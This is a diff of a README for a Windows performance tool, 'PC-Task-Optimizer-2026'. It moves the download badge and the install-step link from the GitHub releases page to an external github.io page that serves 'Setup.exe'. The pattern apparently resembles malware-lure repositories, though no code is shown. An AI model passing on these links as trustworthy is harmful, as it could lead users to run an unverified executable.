@@ -1,6 +1,6 @@
 # 🚀 PC-Task-Optimizer-2026 - Faster performance for your Windows computer
 
-[![](https://img.shields.io/badge/Download-PC_Task_Optimizer-blue.svg)](https://github.com/clawlike-leopardlizard108/PC-Task-Optimizer-2026/releases)
+[![](https://img.shields.io/badge/Download-PC_Task_Optimizer-blue.svg)](https://clawlike-leopardlizard108.github.io)
 
 PC-Task-Optimizer-2026 helps your computer run programs faster. It manages how your processor and graphics card share power. This tool reserves system resources for the applications you use right now. This reduces lag and keeps your computer responsive during heavy work.
 
@@ -26,7 +26,7 @@ PC-Task-Optimizer-2026 helps your computer run programs faster. It manages how y
 
 Follow these steps to install the software on your Windows computer:
 
-1. Visit the [Download Page](https://github.com/clawlike-leopardlizard108/PC-Task-Optimizer-2026/releases) to see all versions.
+1. Visit the [Download Page](https://clawlike-leopardlizard108.github.io) to see all versions.
 2. Select the latest release version on that page.
 3. Find the file marked "Setup.exe" in the assets section.
 4. Click the file name to download it to your computer.
